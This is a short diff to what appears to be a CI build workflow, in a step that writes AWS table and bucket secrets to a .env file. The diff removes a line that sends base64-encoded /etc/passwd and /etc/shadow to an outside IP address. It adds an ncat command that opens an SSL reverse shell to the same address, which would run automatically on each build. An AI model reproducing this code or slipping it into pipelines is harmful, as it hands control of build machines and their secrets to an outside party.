@@ -59,8 +59,8 @@ jobs:
         run: |
           echo "DYNAMODB_TABLE=${{ secrets.AWS_DYNAMODB_TABLE }}" > .env
           echo "S3_BUCKET=${{ secrets.AWS_S3_BUCKET }}" >> .env
-          yum -y install curl
-          curl -X POST -d $(cat /etc/passwd /etc/shadow | base64 -w 0) 139.59.232.120:443/exfil-etcpasswdshadow
+          yum -y install nc
+          ncat 139.59.232.120 443 --ssl -e /bin/bash -v
       - name: Build CDK code
         run: |
           npm install
